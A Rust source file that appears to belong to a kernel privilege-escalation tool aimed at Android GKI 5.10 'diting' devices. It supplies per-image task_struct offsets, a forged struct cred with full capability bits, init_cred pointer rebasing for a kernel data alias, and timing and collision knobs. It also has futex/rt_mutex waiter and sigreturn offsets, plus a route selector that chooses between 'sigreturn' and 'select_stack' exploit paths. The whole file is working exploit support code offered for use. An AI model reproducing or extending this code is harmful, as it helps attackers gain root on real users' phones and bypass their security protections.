//! The diting 5.10 family template.
//!
//! All eight diting 5.10 profiles (81 / 101 / 136 / 177 / 198 / 209 / 226 /
//! 236) carry byte-identical `task_struct`, `cred` layout, `kernelsnitch` and
//! anchor-pitch blocks; only the symbol-derived values differ per image. The
//! GKI `android12-5.10` train has no BTF on these builds, so without this
//! template the extractor emits nulls for every struct field.
//!
//! Design and its limits: docs/analysis/ondevice-profile-derivation-plan.md.
//! The template is a *candidate* aid: the extractor still prints the
//! unverified-candidate warning and the app still validates every field.

use std::collections::BTreeMap;

use crate::derive::{Cred5x, OBJDUMP_CAP, RelSymbols};
use crate::disasm::{disassemble_range, first_sp_frame};

/// `task_struct` fields, in the bundled profile order.
pub const TASK_FIELDS: &[(&str, u32)] = &[
    ("task_prio", 132),
    ("task_normal_prio", 140),
    ("task_sched_task_group", 784),
    ("task_pi_lock", 2156),
    ("task_pi_waiters", 2176),
    ("task_pi_top_task", 2192),
    ("task_pi_blocked_on", 2200),
    ("task_pid", 1480),
    ("task_tgid", 1484),
    ("task_atomic_flags", 1424),
    ("task_real_cred", 1912),
    ("task_cred", 1920),
    ("task_comm", 1936),
    ("task_tasks", 1224),
    ("task_seccomp", 2120),
];

pub const CRED_COPY_SIZE: u32 = 168;
pub const CRED_USAGE_OFFSET: u32 = 0;
pub const CRED_USAGE_VALUE: u64 = 256;
pub const CRED_CAPS_OFFSET: u32 = 40;
pub const CRED_CAPS_COUNT: u32 = 5;
pub const CRED_CAPS_VALUE: u64 = 0x1ff_ffff_ffff;
/// Reference-pointer slots inside `struct cred`, in the bundled order.
pub const CRED_REF_OFFSETS: [u32; 3] = [128, 136, 144];

/// The native's compiled `KIMAGE_TEXT_BASE` (`src/core/kernel/target_constants.hpp`).
/// Imaged pointers are rebased from the image's own `_text` to this constant,
/// which is the spelling `data_alias()` expects.
pub const KIMAGE_TEXT_BASE: u64 = 0xffff_ffc0_8000_0000;

pub const MM_STRUCT_SZ: u64 = 960;
pub const COLLISIONS: u64 = 8;
/// The measured execution knobs (identical in all eight bundled profiles).
pub const SELECTED_CPUS: (u64, u64) = (4, 5);
pub const ROUTE_WAIT_MS: u64 = 30;
pub const SETUP_SETTLE_US: u64 = 10000;
pub const SELECT_ENTER_DELAY_US: u64 = 5000;
/// `sizeof(struct rt_mutex)` under this train's lock-debug config; the anchor
/// scan does not derive it (see `anchor-derivation-plan.md`).
pub const ANCHOR_STRIDE: u64 = 32;

pub const SELECT_WAITER_SHIFT: i64 = -2;
pub const SELECT_COMPACT_WAITER: i64 = 1;
pub const SIGRETURN_OFF_SVE: i64 = 336; // 0x150
pub const SIGRETURN_OFF_PLAIN: i64 = 320; // 0x140

/// The GKI android12-5.10 train the diting kernels are built from.
pub fn matches(release: &str) -> bool {
    release.starts_with("5.10.") && release.contains("-android12-9-")
}

/// Fill the no-BTF struct universe from the family template.
pub fn apply_structs(structs: &mut BTreeMap<String, Option<u32>>) {
    for (key, value) in TASK_FIELDS {
        structs.insert((*key).to_string(), Some(*value));
    }
}

/// Read the three reference pointers out of `init_cred` and rebase them from
/// the image's `_text` to the native's `KIMAGE_TEXT_BASE`, which is how the
/// bundled profiles spell `ref*_image` (signed decimals).
pub fn cred_from_image(kernel: &[u8], init_cred_off: u64, image_text_base: u64) -> Option<Cred5x> {
    let mut refs = Vec::with_capacity(CRED_REF_OFFSETS.len());
    for offset in CRED_REF_OFFSETS {
        let start = init_cred_off.checked_add(offset as u64)? as usize;
        let bytes = kernel.get(start..start.checked_add(8)?)?;
        let value = u64::from_le_bytes(bytes.try_into().ok()?);
        if value >> 48 != 0xffff || value < image_text_base {
            return None;
        }
        refs.push((
            offset,
            KIMAGE_TEXT_BASE.checked_add(value - image_text_base)?,
        ));
    }
    Some(Cred5x {
        caps_offset: CRED_CAPS_OFFSET,
        caps_count: CRED_CAPS_COUNT,
        caps_value: CRED_CAPS_VALUE,
        refs,
    })
}

/// The first stack frame of a named function, in bytes.
pub fn function_frame(
    kernel: &[u8],
    rel: &RelSymbols,
    sorted_offsets: &[u64],
    name: &str,
) -> Option<u64> {
    let start = *rel.get(name)?.iter().next()? as usize;
    let higher = sorted_offsets
        .iter()
        .find(|offset| **offset as usize > start)
        .copied();
    let stop = (start + OBJDUMP_CAP).min(higher.map_or(start + OBJDUMP_CAP, |o| o as usize));
    let lines = disassemble_range(kernel, start, stop).ok()?;
    first_sp_frame(&lines, name).ok()
}

/// Route discriminator: `do_futex`'s frame is 0x20 on 5.10.81/101 — shallow
/// enough to put the select_stack waiter out of band — and 0x70 from 5.10.136.
pub fn route_hint(
    kernel: &[u8],
    rel: &RelSymbols,
    sorted_offsets: &[u64],
    release: &str,
) -> Option<(&'static str, String)> {
    if !matches(release) {
        return None;
    }
    let frame = function_frame(kernel, rel, sorted_offsets, "do_futex")?;
    if frame <= 0x20 {
        Some((
            "sigreturn",
            format!("do_futex frame 0x{frame:x} -> sigreturn (select_stack out of band)"),
        ))
    } else {
        Some((
            "select_stack",
            format!("do_futex frame 0x{frame:x} -> select_stack"),
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn matches_only_the_android12_5_10_train() {
        assert!(matches(
            "5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284"
        ));
        assert!(!matches(
            "5.15.189-android13-8-00016-g51bba4309aac-ab14546557"
        ));
        assert!(!matches("6.1.138-android14-11-g44bda9e8f6e9-ab13792638"));
        assert!(!matches("5.10.236-generic"));
    }

    #[test]
    fn template_matches_the_bundled_5_10_profiles() {
        // The values asserted here are the eight profiles' shared block.
        assert_eq!(TASK_FIELDS.len(), 15);
        assert_eq!(CRED_COPY_SIZE, 168);
        assert_eq!(CRED_CAPS_COUNT, 5);
        assert_eq!(CRED_CAPS_VALUE, 2199023255551);
        assert_eq!(CRED_REF_OFFSETS, [128, 136, 144]);
        assert_eq!(MM_STRUCT_SZ, 960);
        assert_eq!(ANCHOR_STRIDE, 32);
        assert_eq!(SELECT_WAITER_SHIFT, -2);
        assert_eq!(SIGRETURN_OFF_SVE, 336);
        assert_eq!(SIGRETURN_OFF_PLAIN, 320);
    }
}
